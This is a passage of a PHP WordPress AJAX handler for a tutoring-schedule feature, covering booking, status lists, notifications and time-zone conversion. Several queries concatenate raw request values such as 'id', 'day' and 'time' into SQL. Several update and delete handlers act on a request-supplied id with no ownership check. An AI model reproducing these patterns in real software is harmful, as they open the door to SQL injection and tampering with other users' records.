            $original_timezone_ct2 = new DateTimeZone($timezone_scheduled2);
            $datetime_ct2 = new DateTime($original_datetime_ct2, $original_timezone_ct2);
            $target_timezone_ct2 = new DateTimeZone($timezone_name);
            $datetime_ct2->setTimeZone($target_timezone_ct2);

            $chour2 = (int)$dt->format('G');
            $cminute2 = (int)$dt->format('i');
            $uhour2 = (int)$datetime_ed2->format('G');
            $uminute2 = (int)$datetime_ed2->format('i');

            $time1 = $datetime_st2->format('h:ia').' - '.$datetime_ed2->format('h:ia');
            $time3 = $datetime_st2->format('h:i A').' - '.$datetime_ed2->format('h:i A');

            $user = get_user_by('id', $v->tutor_id);

            $price_tutoring = get_user_meta($v->tutor_id, 'price_tutoring', true);
            $pst = empty($price_tutoring)? mw_get_option('price_schedule_tutoring') : $price_tutoring;
            
            if($user){
                $tutor_name = $user->display_name;
            }else{
                $tutor_name = '';
            }

            if($datetime_st2->format('Y-m-d') == $dt->format('Y-m-d')){
                //echo $chour .'|'. $uhour.'<br>';
                //echo $chour. ':'.$cminute.'|'. $uhour. ':'.$uminute.'<br>';
                if($v->confirmed == 0 && $v->canceled == 0 && ($chour2 > $uhour2 || ($uhour2 == $chour2 && $cminute2 >= $uminute2))){
                    $canceled = 1;
                    $confirmed = 0;
                }else{
                    $confirmed = $v->confirmed;
                    $canceled  = $v->canceled;
                }
            }else{
                if(strtotime($datetime_st2->format('Y-m-d')) < strtotime($dt->format('Y-m-d')) && $v->confirmed == 0 && $v->canceled == 0){
                    $confirmed = 0;
                    $canceled  = 1;
                }else{
                    $confirmed = $v->confirmed;
                    $canceled  = $v->canceled;
                }
            }

            $total = $pst;//(int)$v->total_time*$pst/100;
            $location = convert_timezone_to_location($v->time_zone_index);

            if($confirmed == 0 && $canceled == 0 && $v->status == 2){
                $arr_confirmed[] = array(
                        'id' => $v->id,
                        'subject' => $v->subject,
                        'date' => $datetime_st2->format('F d, Y'),
                        'stuff' => $datetime_st2->format('(D)'),
                        'time' => $datetime_st2->format('h:i:a').' ~ '.$datetime_ed2->format('h:i:a'),
                        'time_view' => $time1,
                        'date_view' => $datetime_st2->format('m/d/Y'),
                        'time_view2' => $time3,
                        'confirmed' => $confirmed,
                        'canceled' => $canceled,
                        'accepted'  => $v->accepted,
                        'time_zone' => $v->time_zone,
                        'id_user' => $v->id_user,
                        'tutor_id' => $v->tutor_id,
                        'private_subject' => $v->private_subject,
                        'short_message' => $v->short_message,
                        'note' => $v->note,                        
                        'student_name' => $v->student_name,
                        'tutor_name' => $tutor_name,
                        'status'    => $v->status,
                        'total' => $total,
                        'total_time' => $v->total_time,
                        'time_start' => $datetime_st2->format('Y-m-d / h:i a'),
                        'time_end' => $datetime_ed2->format('Y-m-d / h:i a'),
                        'stime' => strtotime($datetime_st2->format('Y-m-d H:i:s')),
                        'location' => $location,
                        'start_id' => $datetime_st2->format('G_i_a'),
                        'end_id' => $datetime_ed2->format('G_i_a'),
                        'create_on' => $datetime_ct2->format('M d, Y (h:i)'),
                        'fromtime' => $datetime_st2->format('h:i:a'),
                        'totime' => $datetime_ed2->format(' h:i:a'),
                        'day' => $datetime_st2->format('Y-m-d'),
                        'created' => date('Y-m-d H:i:s', strtotime($v->created_on))
                    );
            }
        }
    }

    if(count($arr_confirmed) > 0){
        array_multisort(
            array_column($arr_confirmed, 'stime'), SORT_NUMERIC, SORT_ASC,
            $arr_confirmed
        );
    }

    echo json_encode(array('scheduled' => $arr,'confirmed' => $arr_confirmed,'points' => $user_points));
    die;
}

if($task == 'get_accepted_tutor'){
    $day = $_REQUEST["day"];
    if($day == '')
        $date = date('Y-m-d',time());
    else
        $date = $day;
    $user_id = get_current_user_id();
    $query = "SELECT tp.*, u.display_name AS student_name
            FROM " . $wpdb->prefix . "dict_tutoring_plan AS tp
            LEFT JOIN " . $wpdb->users . " AS u ON u.ID = tp.id_user
            WHERE tp.id_user = ".$user_id." AND tp.status = 2 
            ORDER BY tp.date DESC"; //tp.date = '".$date."' AND 
    $results = $wpdb->get_results($query);
    $arr = array();

    $time_zone = get_user_meta($user_id, 'user_timezone', true);
    $time_zone = empty($time_zone) ? 0 : $time_zone;    
    $u_time_zone_index = get_user_meta($user_id, 'time_zone_index', true);
    $u_time_zone_index = empty($u_time_zone_index)? 0 : $u_time_zone_index;
    $time_zone_name = get_user_meta($user_id, 'time_zone_name', true);
    $timezone_name = empty($time_zone_name)? convert_timezone_to_name($u_time_zone_index):$time_zone_name; 

    $dt = new DateTime('now', new DateTimezone($timezone_name));
    
    if(count($results) > 0){
        foreach ($results as $value) {            
            //echo date('Y-m-d',$timezone).'-'.$date;
            $date_time = explode('~', $value->time);
            $start = substr(trim($date_time[0]),0,-3).' '.strtoupper(substr(trim($date_time[0]),-2));
            $end = substr(trim($date_time[1]),0,-3).' '.strtoupper(substr(trim($date_time[1]),-2));
            $timezone_scheduled = convert_timezone_to_name($value->time_zone_index);
            
            $original_datetime_st = $value->date.' '.$start;
            $original_timezone_st = new DateTimeZone($timezone_scheduled);
            $datetime_st = new DateTime($original_datetime_st, $original_timezone_st);
            $target_timezone_st = new DateTimeZone($timezone_name);
            $datetime_st->setTimeZone($target_timezone_st);
            
            if($datetime_st->format('Y-m-d') == $date && $value->accepted == 1){
                $arr[] = array(
                    'id' => $value->id,
                    'subject' => 'Confirmed'
                );
            }
        }
    }
    echo json_encode(array('accepted' => $arr));
    die;
}

if($task == 'get_request_status'){
    $type = $_REQUEST['type'];
    $user_id = get_current_user_id();
    /*
    if($type == 'confirmed'){
        $where = 'tp.confirmed = 1 AND tp.canceled = 0 AND ';
    }else if($type == 'canceled'){
        $where = 'tp.confirmed = 0 AND tp.canceled = 1 AND ';
    }else if($type == 'waiting'){
        $where = 'tp.confirmed = 0 AND tp.canceled = 0 AND ';
    }else{
        $where = '';
    }*/
    $where = '';
    $query = "SELECT tp.*, u.display_name AS student_name
            FROM " . $wpdb->prefix . "dict_tutoring_plan AS tp
            LEFT JOIN " . $wpdb->users . " AS u ON u.ID = tp.id_user
            WHERE ".$where."tp.id_user = ".$user_id." 
            ORDER BY tp.date DESC";
    $results = $wpdb->get_results($query);
    $arr_all = $arr_confirmed = $arr_canceled = $arr_waiting = array();

    $time_zone = get_user_meta($user_id, 'user_timezone', true);
    $time_zone = empty($time_zone) ? 0 : $time_zone;    
    $u_time_zone_index = get_user_meta($user_id, 'time_zone_index', true);
    $u_time_zone_index = empty($u_time_zone_index)? 0 : $u_time_zone_index;
    $time_zone_name = get_user_meta($user_id, 'time_zone_name', true);
    $timezone_name = empty($time_zone_name)? convert_timezone_to_name($u_time_zone_index):$time_zone_name;   
    
    $dt = new DateTime('now', new DateTimezone($timezone_name));
    
    if(count($results) > 0){
        foreach ($results as $value) {
            $date_time = explode('~', $value->time);
            $start = substr(trim($date_time[0]),0,-3).' '.strtoupper(substr(trim($date_time[0]),-2));
            $end = substr(trim($date_time[1]),0,-3).' '.strtoupper(substr(trim($date_time[1]),-2));
            $timezone_scheduled = convert_timezone_to_name($value->time_zone_index);
            
            $original_datetime_st = $value->date.' '.$start;
            $original_timezone_st = new DateTimeZone($timezone_scheduled);
            $datetime_st = new DateTime($original_datetime_st, $original_timezone_st);
            $target_timezone_st = new DateTimeZone($timezone_name);
            $datetime_st->setTimeZone($target_timezone_st);
        
            $original_datetime_ed = $value->date.' '.$end;
            $original_timezone_ed = new DateTimeZone($timezone_scheduled);
            $datetime_ed = new DateTime($original_datetime_ed, $original_timezone_ed);
            $target_timezone_ed = new DateTimeZone($timezone_name);
            $datetime_ed->setTimeZone($target_timezone_ed);
            
            $original_datetime_ct = $value->created_on;
            $original_timezone_ct = new DateTimeZone($timezone_scheduled);
            $datetime_ct = new DateTime($original_datetime_ct, $original_timezone_ct);
            $target_timezone_ct = new DateTimeZone($timezone_name);
            $datetime_ct->setTimeZone($target_timezone_ct);
            
            $time = $datetime_st->format('h:ia').' - '.$datetime_ed->format('h:ia');
            $time2 = $datetime_st->format('h:i A').' - '.$datetime_ed->format('h:i A');
            
            $chour = (int)$dt->format('G');
            $cminute = (int)$dt->format('i');
            $uhour = (int)$datetime_ed->format('G');
            $uminute = (int)$datetime_ed->format('i');

            $user = get_user_by('id', $value->tutor_id);

            $price_tutoring = get_user_meta($value->tutor_id, 'price_tutoring', true);
            $pst = empty($price_tutoring)? mw_get_option('price_schedule_tutoring') : $price_tutoring;
            
            if($user){
                $tutor_name = $user->display_name;
            }else{
                $tutor_name = '';
            }
            
            if($datetime_st->format('Y-m-d') == $dt->format('Y-m-d')){
                //echo $chour .'|'. $uhour.'<br>';
                //echo $chour. ':'.$cminute.'|'. $uhour. ':'.$uminute.'<br>';
                if($value->confirmed == 0 && $value->canceled == 0 && ($chour > $uhour || ($uhour == $chour && $cminute >= $uminute))){
                    $canceled = 1;
                    $confirmed = 0;
                }else{
                    $confirmed = $value->confirmed;
                    $canceled  = $value->canceled;
                }
            }else{
                if(strtotime($datetime_st->format('Y-m-d')) < strtotime($dt->format('Y-m-d')) && $value->confirmed == 0 && $value->canceled == 0){
                    $confirmed = 0;
                    $canceled  = 1;
                }else{
                    $confirmed = $value->confirmed;
                    $canceled  = $value->canceled;
                }
            }

            $total = $pst;//(int)$value->total_time*$pst/100;
            $location = convert_timezone_to_location($value->time_zone_index);
            
            if($confirmed == 0 && $canceled == 0 && $value->status == 2 && $value->accepted != 2){
                $arr_waiting[] = array(
                        'id' => $value->id,
                        'subject' => $value->subject,
                        'date' => $datetime_st->format('F d, Y'),
                        'stuff' => $datetime_st->format('(D)'),
                        'time' => $datetime_st->format('h:i:a').' ~ '.$datetime_ed->format('h:i:a'),
                        'time_view' => $time,
                        'date_view' => $datetime_st->format('m/d/Y'),
                        'time_view2' => $time2,
                        'confirmed' => $confirmed,
                        'canceled' => $canceled,
                        'time_zone' => $value->time_zone,
                        'id_user' => $value->id_user,
                        'tutor_id' => $value->tutor_id,
                        'private_subject' => $value->private_subject,
                        'short_message' => $value->short_message,
                        'note' => $value->note,                        
                        'student_name' => $value->student_name,
                        'tutor_name' => $tutor_name,
                        'status'    => $value->status,
                        'accepted'  => $value->accepted,
                        'total' => $total,
                        'total_time' => $value->total_time,
                        'time_start' => $datetime_st->format('Y-m-d / h:i a'),
                        'time_end' => $datetime_ed->format('Y-m-d / h:i a'),
                        'stime' => strtotime($datetime_st->format('Y-m-d H:i:s')),
                        'location' => $location,
                        'start_id' => $datetime_st->format('G_i_a'),
                        'end_id' => $datetime_ed->format('G_i_a'),
                        'create_on' => $datetime_ct->format('M d, Y (h:i)'),
                        'fromtime' => $datetime_st->format('h:i:a'),
                        'totime' => $datetime_ed->format(' h:i:a'),
                        'day' => $datetime_st->format('Y-m-d'),
                        'created' => date('Y-m-d H:i:s', strtotime($value->created_on))
                    );
            }else if($confirmed == 1 && $canceled == 0){
                $arr_confirmed[] = array(
                        'id' => $value->id,
                        'subject' => $value->subject,
                        'date' => $datetime_st->format('F d, Y'),
                        'stuff' => $datetime_st->format('(D)'),
                        'time' => $datetime_st->format('h:i:a').' ~ '.$datetime_ed->format('h:i:a'),
                        'time_view' => $time,
                        'date_view' => $datetime_st->format('m/d/Y'),
                        'time_view2' => $time2,
                        'confirmed' => $confirmed,
                        'canceled' => $canceled,
                        'time_zone' => $value->time_zone,
                        'id_user' => $value->id_user,
                        'tutor_id' => $value->tutor_id,
                        'private_subject' => $value->private_subject,
                        'short_message' => $value->short_message,  
                        'note' => $value->note,
                        'student_name' => $value->student_name,
                        'tutor_name' => $tutor_name,
                        'status'    => $value->status,
                        'accepted'  => $value->accepted,
                        'total' => $total,
                        'total_time' => $value->total_time,
                        'time_start' => $datetime_st->format('Y-m-d / h:i a'),
                        'time_end' => $datetime_ed->format('Y-m-d / h:i a'),
                        'stime' => strtotime($datetime_st->format('Y-m-d H:i:s')),
                        'location' => $location,
                        'start_id' => $datetime_st->format('G_i_a'),
                        'end_id' => $datetime_ed->format('G_i_a'),
                        'create_on' => $datetime_ct->format('M d, Y (h:i)'),
                        'fromtime' => $datetime_st->format('h:i:a'),
                        'totime' => $datetime_ed->format(' h:i:a'),
                        'day' => $datetime_st->format('Y-m-d'),
                        'created' => date('Y-m-d H:i:s', strtotime($value->created_on))
                    );
            }else{
                if($value->accepted == 2 || $value->accepted == 0){
                    $arr_canceled[] = array(
                        'id' => $value->id,
                        'subject' => $value->subject,
                        'date' => $datetime_st->format('F d, Y'),
                        'stuff' => $datetime_st->format('(D)'),
                        'time' => $datetime_st->format('h:i:a').' ~ '.$datetime_ed->format('h:i:a'),
                        'time_view' => $time,
                        'date_view' => $datetime_st->format('m/d/Y'),
                        'time_view2' => $time2,
                        'confirmed' => $confirmed,
                        'canceled' => 1,
                        'time_zone' => $value->time_zone,
                        'id_user' => $value->id_user,
                        'tutor_id' => $value->tutor_id,
                        'private_subject' => $value->private_subject,
                        'short_message' => $value->short_message, 
                        'note' => $value->note,
                        'student_name' => $value->student_name,
                        'tutor_name' => $tutor_name,
                        'status'    => $value->status,
                        'accepted'  => $value->accepted,
                        'total' => $total,
                        'total_time' => $value->total_time,
                        'time_start' => $datetime_st->format('Y-m-d / h:i a'),
                        'time_end' => $datetime_ed->format('Y-m-d / h:i a'),
                        'stime' => strtotime($datetime_st->format('Y-m-d H:i:s')),
                        'location' => $location,
                        'start_id' => $datetime_st->format('G_i_a'),
                        'end_id' => $datetime_ed->format('G_i_a'),
                        'create_on' => $datetime_ct->format('M d, Y (h:i)'),
                        'fromtime' => $datetime_st->format('h:i:a'),
                        'totime' => $datetime_ed->format(' h:i:a'),
                        'day' => $datetime_st->format('Y-m-d'),
                        'created' => date('Y-m-d H:i:s', strtotime($value->created_on))
                    );
                }
            }
        }
    }
    
    if(count($arr_confirmed) > 0){
        array_multisort(
            array_column($arr_confirmed, 'stime'), SORT_NUMERIC, SORT_DESC,
            $arr_confirmed
        );
    }
    
    if(count($arr_canceled) > 0){
        array_multisort(
            array_column($arr_canceled, 'stime'), SORT_NUMERIC, SORT_DESC,
            $arr_canceled
        );
    }
    
    if(count($arr_waiting) > 0){
        array_multisort(
            array_column($arr_waiting, 'stime'), SORT_NUMERIC, SORT_DESC,
            $arr_waiting
        );
    }
    
    if($type == 'confirmed'){
        $arr_all = $arr_confirmed;
    }else if($type == 'canceled'){
        $arr_all = $arr_canceled;
    }else if($type == 'waiting'){
        $arr_all = $arr_waiting;
    }else{
        $arr_all = array_merge($arr_waiting,$arr_confirmed,$arr_canceled);
    }

    echo json_encode(array('status' => $arr_all));
    die;
}
if($task == 'get_quick_notification'){
    $day = $_REQUEST['day'];
    $user_id = get_current_user_id();
    
    $where = '';
    $query = "SELECT tp.*, u.`display_name` AS student_name, tn.`id` AS tid
            FROM " . $wpdb->prefix . "dict_tutoring_plan AS tp
            LEFT JOIN " . $wpdb->users . " AS u ON u.ID = tp.id_user
            LEFT JOIN " . $wpdb->prefix . "dict_tutoring_notification AS tn ON tn.tid = tp.id
            WHERE tp.confirmed != 1 AND tn.userid = ".$user_id." 
            ORDER BY tp.date DESC";
    $results = $wpdb->get_results($query);
    $arr = array();

    $time_zone = get_user_meta($user_id, 'user_timezone', true);
    $time_zone = empty($time_zone) ? 0 : $time_zone;    
    $u_time_zone_index = get_user_meta($user_id, 'time_zone_index', true);
    $u_time_zone_index = empty($u_time_zone_index)? 0 : $u_time_zone_index;
    $time_zone_name = get_user_meta($user_id, 'time_zone_name', true);
    $timezone_name = empty($time_zone_name)? convert_timezone_to_name($u_time_zone_index):$time_zone_name;   
    
    $dt = new DateTime('now', new DateTimezone($timezone_name));
    
    if(count($results) > 0){
        foreach ($results as $value) {
            $date_time = explode('~', $value->time);
            $start = substr(trim($date_time[0]),0,-3).' '.strtoupper(substr(trim($date_time[0]),-2));
            $end = substr(trim($date_time[1]),0,-3).' '.strtoupper(substr(trim($date_time[1]),-2));
            $timezone_scheduled = convert_timezone_to_name($value->time_zone_index);
            
            $original_datetime_st = $value->date.' '.$start;
            $original_timezone_st = new DateTimeZone($timezone_scheduled);
            $datetime_st = new DateTime($original_datetime_st, $original_timezone_st);
            $target_timezone_st = new DateTimeZone($timezone_name);
            $datetime_st->setTimeZone($target_timezone_st);
        
            $original_datetime_ed = $value->date.' '.$end;
            $original_timezone_ed = new DateTimeZone($timezone_scheduled);
            $datetime_ed = new DateTime($original_datetime_ed, $original_timezone_ed);
            $target_timezone_ed = new DateTimeZone($timezone_name);
            $datetime_ed->setTimeZone($target_timezone_ed);
            
            $original_datetime_ct = $value->created_on;
            $original_timezone_ct = new DateTimeZone($timezone_scheduled);
            $datetime_ct = new DateTime($original_datetime_ct, $original_timezone_ct);
            $target_timezone_ct = new DateTimeZone($timezone_name);
            $datetime_ct->setTimeZone($target_timezone_ct);
            
            $time = $datetime_st->format('h:ia').' - '.$datetime_ed->format('h:ia');
            $time2 = $datetime_st->format('h:i A').' - '.$datetime_ed->format('h:i A');
            
            $chour = (int)$dt->format('G');
            $cminute = (int)$dt->format('i');
            $uhour = (int)$datetime_ed->format('G');
            $uminute = (int)$datetime_ed->format('i');

            $user = get_user_by('id', $value->tutor_id);

            $price_tutoring = get_user_meta($value->tutor_id, 'price_tutoring', true);
            $pst = empty($price_tutoring)? mw_get_option('price_schedule_tutoring') : $price_tutoring;
            
            if($user){
                $tutor_name = $user->display_name;
            }else{
                $tutor_name = '';
            }
            
            if($datetime_st->format('Y-m-d') == $dt->format('Y-m-d')){
                if($value->confirmed == 0 && $value->canceled == 0 && ($chour > $uhour || ($uhour == $chour && $cminute >= $uminute))){
                    $canceled = 1;
                    $confirmed = 0;
                }else{
                    $confirmed = $value->confirmed;
                    $canceled  = $value->canceled;
                }
            }else{
                if(strtotime($datetime_st->format('Y-m-d')) < strtotime($dt->format('Y-m-d')) && $value->confirmed == 0 && $value->canceled == 0){
                    $confirmed = 0;
                    $canceled  = 1;
                }else{
                    $confirmed = $value->confirmed;
                    $canceled  = $value->canceled;
                }
            }

            $total = $pst;//(int)$value->total_time*$pst/100;
            $location = convert_timezone_to_location($value->time_zone_index);
            
            if($value->accepted == 1 || $value->accepted == 2 || ($confirmed == 0 && $canceled == 1)){
                $arr[] = array(
                    'tid' => $value->tid,
                    'id' => $value->id,
                    'subject' => $value->subject,
                    'date' => $datetime_st->format('F d, Y'),
                    'stuff' => $datetime_st->format('(D)'),
                    'time' => $datetime_st->format('h:i:a').' ~ '.$datetime_ed->format('h:i:a'),
                    'time_view' => $time,
                    'date_view' => $datetime_st->format('m/d/Y'),
                    'time_view2' => $time2,
                    'confirmed' => $confirmed,
                    'canceled' => $canceled,
                    'time_zone' => $value->time_zone,
                    'id_user' => $value->id_user,
                    'tutor_id' => $value->tutor_id,
                    'private_subject' => $value->private_subject,
                    'short_message' => $value->short_message,
                    'note' => $value->note,                        
                    'student_name' => $value->student_name,
                    'tutor_name' => $tutor_name,
                    'status'    => $value->status,
                    'accepted'  => $value->accepted,
                    'total' => $total,
                    'total_time' => $value->total_time,
                    'time_start' => $datetime_st->format('Y-m-d / h:i a'),
                    'time_end' => $datetime_ed->format('Y-m-d / h:i a'),
                    'stime' => strtotime($datetime_st->format('Y-m-d H:i:s')),
                    'location' => $location,
                    'start_id' => $datetime_st->format('G_i_a'),
                    'end_id' => $datetime_ed->format('G_i_a'),
                    'create_on' => $datetime_ct->format('M d, Y (h:i)'),
                    'fromtime' => $datetime_st->format('h:i:a'),
                    'totime' => $datetime_ed->format(' h:i:a'),
                    'day' => $datetime_st->format('Y-m-d'),
                    'created' => date('Y-m-d H:i:s', strtotime($value->created_on))
                );
            }
        }
    }
    
    if(count($arr) > 0){
        array_multisort(
            array_column($arr, 'stime'), SORT_NUMERIC, SORT_DESC,
            $arr
        );
    }

    echo json_encode(array('notifications' => $arr));
    die;
}
if ($task == "remove_quick_notification") {
    $id = $_REQUEST['id'];
    $user_id = get_current_user_id();

    $wpdb->delete(
        $wpdb->prefix . 'dict_tutoring_notification', array(
            'id' => $id
        )
    );

    $query = "SELECT tn.*
            FROM " . $wpdb->prefix . "dict_tutoring_notification AS tn
            WHERE tn.userid = ".$user_id;
    $results = $wpdb->get_results($query);

    echo count($results);
    exit;
}
if($task == 'get_view_by_timezone'){
    $id = $_REQUEST['id'];
    $time_zone = $_REQUEST['timezone'];
    $time_zone_name = $_REQUEST['name'];
    $u_time_zone_index = $_REQUEST['index'];
    $user_id = get_current_user_id();

    $query = "SELECT tp.*, u.display_name AS student_name
            FROM " . $wpdb->prefix . "dict_tutoring_plan AS tp
            LEFT JOIN " . $wpdb->users . " AS u ON u.ID = tp.id_user
            WHERE tp.id = ".$id." AND tp.id_user = ".$user_id." 
            ORDER BY tp.date DESC";
    $result = $wpdb->get_row($query);
    $arr = array();
    $pst = mw_get_option('price_schedule_tutoring');
    $time_zone = empty($time_zone) ? 0 : $time_zone;  
    $u_time_zone_index = empty($u_time_zone_index)? 0 : $u_time_zone_index;
    $timezone_name = empty($time_zone_name)? convert_timezone_to_name($u_time_zone_index):$time_zone_name; 
    $arr = array();
    if($result){
        $date_time = explode('~', $result->time);
        $start = substr(trim($date_time[0]),0,-3).' '.strtoupper(substr(trim($date_time[0]),-2));
        $end = substr(trim($date_time[1]),0,-3).' '.strtoupper(substr(trim($date_time[1]),-2));
        $timezone_scheduled = convert_timezone_to_name($result->time_zone_index);
        
        $original_datetime_st = $result->date.' '.$start;
        $original_timezone_st = new DateTimeZone($timezone_scheduled);
        $datetime_st = new DateTime($original_datetime_st, $original_timezone_st);
        $target_timezone_st = new DateTimeZone($timezone_name);
        $datetime_st->setTimeZone($target_timezone_st);
    
        $original_datetime_ed = $result->date.' '.$end;
        $original_timezone_ed = new DateTimeZone($timezone_scheduled);
        $datetime_ed = new DateTime($original_datetime_ed, $original_timezone_ed);
        $target_timezone_ed = new DateTimeZone($timezone_name);
        $datetime_ed->setTimeZone($target_timezone_ed);
        
        $original_datetime_ct = $result->created_on;
        $original_timezone_ct = new DateTimeZone($timezone_scheduled);
        $datetime_ct = new DateTime($original_datetime_ct, $original_timezone_ct);
        $target_timezone_ct = new DateTimeZone($timezone_name);
        $datetime_ct->setTimeZone($target_timezone_ct);
        
        $time = $datetime_st->format('h:ia').' - '.$datetime_ed->format('h:ia');

        $user = get_user_by('id', $result->tutor_id);
        
        if($user){
            $tutor_name = $user->display_name;
        }else{
            $tutor_name = '';
        }

        $total = (int)$result->total_time*$pst/100;
        $location = convert_timezone_to_location($result->time_zone_index);
        $arr = array(
                    'id' => $result->id,
                    'subject' => $result->subject,
                    'date' => $datetime_st->format('F d, Y'),
                    'stuff' => $datetime_st->format('(l)'),
                    'time' => $datetime_st->format('h:i:a').' ~ '.$datetime_ed->format('h:i:a'),
                    'time_view' => $time,
                    'confirmed' => $result->confirmed,
                    'canceled' => $result->canceled,
                    'time_zone' => $result->time_zone,
                    'id_user' => $result->id_user,
                    'tutor_id' => $result->tutor_id,
                    'private_subject' => $result->private_subject,
                    'short_message' => $result->short_message,                        
                    'student_name' => $result->student_name,
                    'tutor_name' => $tutor_name,
                    'status'    => $result->status,
                    'total' => $total,
                    'total_time' => $result->total_time,
                    'time_start' => $datetime_st->format('Y-m-d / h:i a'),
                    'time_end' => $datetime_ed->format('Y-m-d / h:i a'),
                    'stime' => strtotime($datetime_st->format('Y-m-d H:i:s')),
                    'location' => $location,
                    'start_id' => $datetime_st->format('G_i_a'),
                    'end_id' => $datetime_ed->format('G_i_a'),
                    'create_on' => $datetime_ct->format('M d, Y (h:i)'),
                    'fromtime' => $datetime_st->format('h:i:a'),
                    'totime' => $datetime_ed->format(' h:i:a'),
                    'day' => $datetime_st->format('Y-m-d'),
                    'created' => date('Y-m-d H:i:s', strtotime($result->created_on))
                );
    }

    echo json_encode($arr);
    die;
}
if ($task == "accept_confirm_tutoring") {
    $id = $_REQUEST['id'];
    $confirmed = $_REQUEST['confirmed'];
    if((int)$confirmed == 0){
        $wpdb->update( $wpdb->prefix . 'dict_tutoring_plan', array('confirmed' => 1, 'canceled' => 0), array('id' => $id) );
    }
    echo 1;
    exit;
}
if ($task == "cancel_confirm_tutoring") {
    $id = $_REQUEST['id'];
    $canceled = $_REQUEST['canceled'];
    if((int)$canceled == 0){
        $wpdb->update( $wpdb->prefix . 'dict_tutoring_plan', array('canceled' => 1, 'confirmed' => 0), array('id' => $id) );
    }
    echo 1;
    exit;
}
if ($task == "save_tutoring_plan") {
    $title = $_REQUEST['title'];
    $time_zone = $_REQUEST['time_zone'];
    $time_zone_index = $_REQUEST['time_zone_index'];
    $subject_type = $_REQUEST['subject_type'];
    $description = $_REQUEST['description'];
    $choose_tutor = $_REQUEST['choose_tutor']; 
    $day = $_REQUEST['day'];
    $time = $_REQUEST['time'];
    $total = $_REQUEST['total'];
    $total_time = $_REQUEST['total_time'];
    $current_user_id = get_current_user_id();
    /*$user_subject = '';
    $subs = array(
                'english_writting' => 'English Writting',
                'english_conversation' => 'English Conversation',
                'math_elementary' => 'Math (upto elementary)',            
                'math_any_level' => 'Math (any level)',
                'other' => 'Others'
            );   
    
    if ($subject_type != '') {
        $arr_sub = explode('_',$subject_type);
        if(count($arr_sub) == 0)
            $user_subject = $subject_type;
        else
            $user_subject = $subs[$subject_type];
    }
    if($user_subject == '') $user_subject = 'English Writting';
    */
    $user_points = get_user_meta($current_user_id, 'user_points', true);
    $user_points = empty($user_points) ? 0 : $user_points;
    
    if((int)$total > $user_points){
        echo 0;
        exit;
    }else{
        $timezone = get_user_meta($current_user_id, 'user_timezone', true);
        if(empty($timezone)){
            update_user_meta($current_user_id, 'user_timezone', $time_zone);
            update_user_meta($current_user_id, 'time_zone_index', $time_zone_index);
        }
        $query = 'SELECT id
        FROM ' . $wpdb->prefix . 'dict_tutoring_plan
        WHERE id_user = '.$current_user_id.' AND tutor_id = '.$choose_tutor.' AND date = \''.$day.'\' AND time = \''.$time.'\'';
        $row = $wpdb->get_row($query);
        if($row){
            $id = $row->id;
            $result = $wpdb->update(
                $wpdb->prefix . 'dict_tutoring_plan', array(
                    'subject' => $subject_type,
                    'private_subject' => $title,
                    'short_message' => $description,
                    'time_zone' => $time_zone,
                    'time_zone_index' => $time_zone_index,
                    'status' => 2
                ), array('id' => $id)
            );
        }else{
            $upoints = $user_points - (int)$total;
            update_user_meta($current_user_id, 'user_points', $upoints);
            $wpdb->insert(
                    $wpdb->prefix . 'dict_tutoring_plan', array(
                    'subject' => $subject_type,
                    'tutor_id' => $choose_tutor,
                    'date' => $day,
                    'time' => $time,
                    'time_zone' => $time_zone,
                    'time_zone_index' => $time_zone_index,
                    'id_user' => $current_user_id,
                    'private_subject' => $title,
                    'short_message' => $description,
                    'total_time' => $total_time,
                    'type_tutor' => 0,
                    'paid'       => 1, 
                    'confirmed'  => 0,  
                )
            );
            $id = $wpdb->insert_id;
        } 

        $query_notifi = 'SELECT id
        FROM ' . $wpdb->prefix . 'dict_tutoring_notification
        WHERE userid = '.$current_user_id.' AND tid = '.$id;
        $notifi = $wpdb->get_row($query_notifi); 
        if($notifi){
            echo $id;
            exit;
        }else{
            $wpdb->insert(
                    $wpdb->prefix . 'dict_tutoring_notification', array(
                    'tid' => $id,
                    'userid' => $current_user_id
                )
            );

            echo $id;
            exit;
        }        
    } 
}
if ($task == "save_tutoring_desc") {
    $id = $_REQUEST['id'];
    $description = $_REQUEST['description'];
    $type = $_REQUEST['type'];
    if($type == 'note'){
        $result = $wpdb->update(
                    $wpdb->prefix . 'dict_tutoring_plan', array(
                        'note' => $description
                    ), array('id' => $id)
                );
    }else{
        $result = $wpdb->update(
                    $wpdb->prefix . 'dict_tutoring_plan', array(
                        'short_message' => $description
                    ), array('id' => $id)
                );
    }
    echo 1;
    exit;
}
if ($task == "update_timezone") {
    $user_id = get_current_user_id();
    $timezone = $_REQUEST['timezone'];
    $name = $_REQUEST['name'];
    $index = $_REQUEST['index'];
    if (isset($timezone) && trim($timezone) != '') {
        update_user_meta($user_id, 'user_timezone', $timezone);
        update_user_meta($user_id, 'time_zone_index', $index);       
        update_user_meta($user_id, 'time_zone_name', $name);
    }
    echo 1;
    exit;
}
if ($task == "get_tutoring_date_active") {
    $timezone = $_REQUEST['timezone'];
    $name = $_REQUEST['name'];
    $index = $_REQUEST['index'];
    
    $user_id = get_current_user_id();
    $query = 'SELECT tp.*, u.display_name AS student_name
        FROM ' . $wpdb->prefix . 'dict_tutoring_plan AS tp
        LEFT JOIN ' . $wpdb->users . ' AS u ON u.ID = tp.id_user
        WHERE tp.id_user = '.$user_id.' AND tp.status = 2
        GROUP BY tp.date
        ORDER BY tp.date ASC';
    $results = $wpdb->get_results($query);
    $arr = array();
    // $time_zone = get_user_meta($user_id, 'user_timezone', true);
    // $time_zone = empty($time_zone) ? 0 : $time_zone;    
    // $u_time_zone_index = get_user_meta($user_id, 'time_zone_index', true);
    // $u_time_zone_index = empty($u_time_zone_index)? 0 : $u_time_zone_index;
    // $time_zone_name = get_user_meta($user_id, 'time_zone_name', true);
    // $timezone_name = empty($time_zone_name)? convert_timezone_to_name($u_time_zone_index):$time_zone_name;
    if(count($results) > 0){
        foreach ($results as $value) {
            $date_time = explode('~', $value->time);
            $start = substr(trim($date_time[0]),0,-3).' '.strtoupper(substr(trim($date_time[0]),-2));
            $end = substr(trim($date_time[1]),0,-3).' '.strtoupper(substr(trim($date_time[1]),-2));
            $timezone_scheduled = convert_timezone_to_name($value->time_zone_index);
            $original_datetime = $value->date.' '.$start;
            $original_timezone = new DateTimeZone($timezone_scheduled);
            $datetime = new DateTime($original_datetime, $original_timezone);
            $target_timezone = new DateTimeZone($name);
            $datetime->setTimeZone($target_timezone);
            $arr[] = $datetime->format('Y-m-d');
        }
    }
    echo json_encode($arr);
    exit;
}
if ($task == "get_schedule_now") {
    $tutor_id = $_REQUEST['id'];
    $day = $_REQUEST['day'];
